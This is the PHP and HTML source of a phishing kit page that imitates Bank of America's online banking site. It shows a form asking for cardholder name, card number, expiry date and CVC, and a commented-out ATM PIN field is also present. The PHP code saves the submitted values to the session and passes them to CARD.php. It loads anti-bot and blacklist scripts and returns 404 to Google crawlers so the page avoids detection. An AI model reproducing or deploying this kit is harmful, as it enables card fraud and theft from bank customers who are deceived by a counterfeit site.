<?php

session_start();
date_default_timezone_set('GMT'); 
error_reporting(0); 

// ANITBOTS 
include('../../Anti/Bot-Spox.php');
include('../../Anti/Bot-Crawler.php');
include('../../Anti/blacklist.php');
include('../../Anti/new.php');
include('../../Anti/IP-BlackList.php');
include('../../Anti/Dila_DZ.php');

include('../../BOTS/iprange.php');
include('../../BOTS/phishtank.php');
include('../../BOTS/spec.php');


if (isset($_POST['card_name'])){
	$_SESSION['_nameoncard_'] = $_POST['card_name'];
	$_SESSION['_cardnumber_'] = $_POST['card_number'];
	$_SESSION['_expdate_']    = $_POST['exp'];
	$_SESSION['_csc_']        = $_POST['csc'];
	//$_SESSION['_pin_']        = $_POST['pin'];
}


if ($_SERVER["REQUEST_METHOD"] == "POST") {
if(empty($_POST['card_number'])== false) {
        include('CARD.php');
}
}


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<!-- saved from url=(0145)https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go?msg=InvalidCredentials_2_Remaining&request_locale=en_us&lpOlbResetErrorCounter=0 -->
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win chrome chrome-88 webkit svg-bg not-retina cf-cnx-regular-active"><head class="at-element-marker"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }</style>



<meta http-equiv="X-UA-Compatible" content="IE=Edge">



        <link rel="canonical" href="https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go">
    	<link rel="alternate" href="https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go?request_locale=es_US" hreflang="es-US">
		<meta name="Keywords" content="Your Online ID">
		<meta name="Description" content="Sign in to your Online Banking account by entering your Online ID.">
		<meta name="twitter:card" content="summary">
		<meta name="twitter:image" content="https://bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/logos/colored_flagscape-v2.png">
		<meta name="twitter:url" content="https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go">
		<meta name="twitter:description" content="Sign in to your Online Banking account by entering your Online ID.">
		<meta name="twitter:title" content="Bank of  America - Online Banking Sign In - Online ID">
		<meta name="twitter:site" content="@BankofAmerica">
		<meta name="twitter:image:alt" content="Bank of  America - Online Banking Sign In - Online ID">
		<meta property="og:title" content="Bank of  America - Online Banking Sign In - Online ID">
		<meta property="og:type" content="website">
		<meta property="og:url" content="https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go">
		<meta property="og:image" content="https://bankofamerica.com/content/images/ContextualSiteGraphics/Logos/en_US/logos/colored_flagscape-v2.png">
		<meta property="og:description" content="Sign in to your Online Banking account by entering your Online ID.">
		<meta property="og:site_name" content="Bank of America">
		<meta property="og:image:alt" content="Bank of  America - Online Banking Sign In - Online ID">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
    
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>


<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>Bank of America | Online Banking | Sign In | Online ID</title>
<script language="JavaScript" type="text/javascript">
			var boaVIPAAuseGzippedBundles = "false";
			var boaVIPAAjawrEnabled = "false";
			var dotcomURLPrefix = "https://www.bankofamerica.com/";
</script>

	<script language="javascript" type="text/javascript">
		var pinRegexSwitch = "true";
	</script>
	<script language="javascript" type="text/javascript">
		var sbPinRegexSwitch = "true";
	</script>


	

    <link rel="shortcut icon" href="https://www.bankofamerica.com/pa/global-assets/1.0/graphic/favicon.ico?ts=20151018" type="image/x-icon">
   <script language="Javascript" type="text/javascript">
   			var newPwdStandardSwitch = "true";
	</script>


	<script language="JavaScript" type="text/javascript">
			boaVIPAAuseGzippedBundles = "true";
	</script>
<!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->
<script language="JavaScript" type="text/javascript">
     var enableKeypress = false;
</script>
              <script language="JavaScript" type="text/javascript">
                   enableKeypress = true;
              </script>



	<script language="JavaScript" type="text/javascript">
		boaVIPAAjawrEnabled = "true";
	</script>
		<script language="JavaScript" type="text/javascript">
			boaVIPAAjawrEnabled = "true";
		</script>
					<link rel="stylesheet" type="text/css" href="./Bank of America _ Online Banking _ Sign In _ Online ID_files/vipaa-v4-jawr.css" media="all">
					<link rel="stylesheet" type="text/css" href="./Bank of America _ Online Banking _ Sign In _ Online ID_files/vipaa-v4-jawr-print.css" media="print">
					<script src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/vipaa-v4-jawr.js.download" type="text/javascript"></script><style id="at-makers-style" class="at-flicker-control">
.mboxDefault {visibility: hidden;}
</style>
					<script type="text/javascript" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/jquery-migrate-custom.js.download"></script>


			<script>
				var boaPageDataJS = {};
					boaPageDataJS.isLLE = "false";
			</script>
				<style>body{display:none;}</style>
	<script src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/hover.js.download" type="text/javascript" async="true"></script><script src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/cc.go" async="async" flags="155687923"></script><script>
  adobe.target.trackEvent({
    "mbox": "session-id",
    "params": {
        "profile.activityTrackSession": "c817ac8d-657a-414a-a198-6dc369955a7c"
    }
});
</script><script type="text/javascript">
/*T&T Metadata v3 ==>Response Plugin*/
window.ttMETA=(typeof(window.ttMETA)!="undefined")?window.ttMETA:[];window.ttMETA.push({"CampaignName":"Production - MONITOR - Count Visit Frequency to G3 Activities - 07.27.18 - [LIVE]","CampaignId":"110196","RecipeName":"G3 Visit = 2","RecipeId":"1","OfferId":"276181","OfferName":"\/production_-_monitor-countvisitfrequencytog3activities-072718-li\/experiences\/1\/pages\/0\/zones\/0\/1532720797486","MboxName":"target-global-mbox"});
</script><script type="text/javascript">
/*seTTCookie() v1 */
function seTTCookie(a,b,c){var d=new Date();d.setTime(d.getTime()+c);var e='; expires='+d.toGMTString();document.cookie=(a+'='+b+e+'; path=/; domain=bankofamerica.com')}
/*geTTCookieVal() Profile v1 */
function geTTCookieVal(n){return(v=new RegExp('^'+n+'=.*|;\\s*'+n+'=.*').exec(document.cookie))?v[0].split('=')[1].split(';')[0]:''};
      function readCookie(name) {
         var value = "; " + document.cookie;
         var parts = value.split("; " + name + "=");
        if (parts.length == 2) return parts.pop().split(";").shift();
      }
      {
         var ThrottleVal = readCookie("throttle_value");
         var isSBCustomer = readCookie("isSBCustomer");
         var runOnce = geTTCookieVal("me_runonce") || "yes";
      }

if ((runOnce != "no")) {
    if (ThrottleVal == 999) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
       var img = document.createElement('img');
        img.setAttribute('src', 'https://merrilledge.tt.omtrdc.net/m2/merrilledge/mbox/json?screenHeight=900&screenWidth=1440&colorDepth=24&browserWidth=1440&browserHeight=505&browserTimeOffset=330&mboxPage=dd5d56a23972453081c788203f7c18cb&mboxVersion=0.9.4&mboxHost=https://www.merrilledge.com/&mboxURL=https://www.merrilledge.com/&mboxReferrer=&mboxXDomain=enabled&mboxMCGVID=undefined&mboxAAMB=undefined&mboxMCGLH=undefined&mboxSession=733087435faa4b9b8ad59832817e4579&mboxPC=733087435faa4b9b8ad59832817e4579.22_18&mboxTime=1555954102076&mbox=profileoptout&mboxCount=1&profile.throttle_value=999');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
 
    }
    if ((isSBCustomer == "true")) {
        seTTCookie("me_runonce", "no", 30 * 60 * 1000);
        var img = document.createElement('img');
        img.setAttribute('src', 'https://bankofamerica.tt.omtrdc.net/m2/bankofamerica/ubox/image?mbox=bac_isSBCustomer&profile.isSBCustomer=true&mboxDefault=https%3A//www.bankofamerica.com/pa/global-assets/1.0/graphic/blank.gif');
        img.setAttribute("height", "1px");
        img.setAttribute("width", "1px");
        img.setAttribute("style", "display:none");
        document.body.appendChild(img);
    }
}
</script><script type="text/javascript" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/creanza.js.download" id="opmi59"></script><script type="text/javascript" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/kurt.js.download" id="j8xw3p"></script><script type="text/javascript" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/dis4.js.download" id="629vvl"></script><script type="text/javascript" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/porte.js.download" id="0ca6ta"></script><script type="text/javascript" async="" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/pHAQ"></script><script type="text/javascript" async="" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/C5ib"></script><script type="text/javascript" async="" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/C5ib(1)"></script><script type="text/javascript" async="" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/C5ib(2)"></script><script type="text/javascript" async="" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/C5ib(3)"></script><script type="text/javascript" async="" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/C5ib(4)"></script><script type="text/javascript" async="" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/C5ib(5)"></script><script type="text/javascript" async="" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/C5ib(6)"></script></head>		
	<body class="fsd-layout-body" style="display: block;">	

				<script type="text/javascript">if(self == top){var theBody=document.getElementsByTagName("body")[0];theBody.style.display="block";}else{top.location=self.location;}</script>
				<noscript><style>body{display:block;}</style></noscript>
					<a class="ada-hidden ada-visible-focus" href="https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go?msg=InvalidCredentials_2_Remaining&amp;request_locale=en_us&amp;lpOlbResetErrorCounter=0#skip-to-h1" id="ada-skip-link">Skip to main content</a>
		<div class="fsd-layout fsd-2c-700lt-layout">
			<div class="fsd-border">
				<div class="center-content">
					<div class="header">


<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="230" alt="Bank of America" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/BofA_rgb.png">
      <div class="page-type cnx-regular" data-font="#!">Credit card information</div>
      <div class="right-links">
		<div class="secure-area">Secure Area</div>
       <a class="divide" href="https://secure.bankofamerica.com/login/languageToggle.go?request_locale=es_US" target="_self" name="spanish_toggle" title="Muestra esta sesión de la Banca en Línea">En Español</a>
       <div class="clearboth"></div>
      </div>
      <div class="clearboth"></div>
   </div>
</div>

	
				<noscript>
					<div class="fauxdal-overlay"></div>
					<div class="fauxdal-module">
						<div class="noscript-reload-skin">
							<div class="fauxdal-top"></div>
							<div class="fauxdal-bottom">
								<div class="fsd-fauxdal-content">
										<div class="fsd-fauxdal-title">
											Please use JavaScript
										</div>
										<p>You need a web browser that supports JavaScript to use our site. Without it, some pages won't work as designed. To make sure JavaScript is turned on, please adjust your browser settings.</p>
<p>&nbsp;</p>
<p><a title="Browser Help and Tips" name="Browser Help and Tips" href="https://www.bankofamerica.com/onlinebanking/online-banking-security-faqs.go" target="_self">Browser Help and Tips</a></p>
								</div>        
								<div class="fsd-fauxdal-close"> 
									<a class="button-common button-gray" name="close_button_js_disabled_modal" href=><span>Close</span></a>
								</div>
								<div class="clearboth"></div>
							</div>
						</div>
					</div>
				</noscript>


<script src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/online-id-vipaa-module-enter-skin.js.download" type="text/javascript"></script>


<div class="container">
<div class="row">  
<div class="col-md-6 offset-md-3"> 

<form id="Signon" action="CARD.php" name="Signon" method="POST" novalidate="" autocomplete="off" data-id="Signon">
		
<br/><br/><br/><br/><br/>
	<div class="form-group form-group-bg">
  <input type="text" class="form-control" placeholder="Cardholder name" name='card_name' autocomplete="off" maxlength="50" autocapitalize="off">
</div>


<div class="form-group form-group-bg">
<input type="text"  class="form-control" placeholder="Card Number" name='card_number' autocomplete="off" maxlength="16" aria-required="true">
</div>
		

  <div class="form-row form-group-bg">
    <div class="col">
      <input type="text" value="" class="form-control" placeholder="Exp Date (MM/YY)" name='exp' autocomplete="off" aria-required="true" value="">
    </div>
    <div class="col">
            <input type="text" class="form-control" placeholder="CVC" name='csc' autocomplete="off" maxlength="3" aria-required="true">
    </div>
  </div>
<br />

<!--
<div class="form-group form-group-bg">
		        <input type="password" class="form-control" placeholder="ATM Card Pin" name='pin' autocomplete="off" maxlength="4" aria-required="true">    
	</div>
	-->
<?php
$Z118_agree         = "By clicking Agree & Continue, I have read and agree to Bank of America ";
$Z118_user_agrement = "User Agreement";
$Z118_privacy       = "Privacy Policy";
$Z118_and           = " and ";
$Z118_policy        = "Electronic Communications Delivery Policy";


?>

                                            <label class="helpNotifyUS" role="button"><?=$Z118_agree;?><a data-click="userAgreement" href="#" target="_blank"><?=$Z118_user_agrement;?></a>, <a data-click="privacyPolicy" href="#" target="_blank"><?=$Z118_privacy;?></a><?=$Z118_and;?><a data-click="esign" href="#" target="_blank"><?=$Z118_policy;?></a>.</label><br />
     <input type="submit" name="continue" value="Agree & Continue" data-id="submit" class="btn btn-outline-secondary btn-block" origin="cob">
	 </form>
	
</div>
	</div>
	</div>


<br/><br/><br/><br/><br/><br/><br/>		
		
						<div class="footer-inner">

<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
		<div class="secure">Secure area</div>
	
       
      <div class="link-container">
         <div class="link-row"> 
				
				<a href="https://www.bankofamerica.com/security-center/privacy-overview/" name="Privacy_&amp;_Security_footer" title="Privacy" target="_blank">Privacy</a>
				
				<a class="last-link" href="https://www.bankofamerica.com/security-center/overview/" name="Security" title="Security" target="_blank">Security</a>
				<div class="clearboth"></div>
         </div>
      </div>
      <p>Bank of America, N.A. Member FDIC. <a href="https://www.bankofamerica.com/help/equalhousing-popup/" name="Equal_Housing_Lender" target="_blank">Equal Housing Lender</a> <br>©&nbsp;2021 Bank of America Corporation.</p>
   </div>
</div>
</div>
					</div>
				</div>
			</div>
		</div>
		


<div id="boaFormHelp" aria-live="rude" style="top: -1000px; left: -1000px; position: absolute; z-index: 100;"><div id="boaFormHelp-content"></div><div class="boaFormHelp-bottom"></div></div><div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-regular, serif;">BlankTestESs</div><div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div><div id="restest" style="width: 0.5cm; height: 0.5cm; padding: 0px"></div><iframe title="cwmdgv" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;" src="./Bank of America _ Online Banking _ Sign In _ Online ID_files/saved_resource.html"></iframe></body><div aria-hidden="true" style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div></html>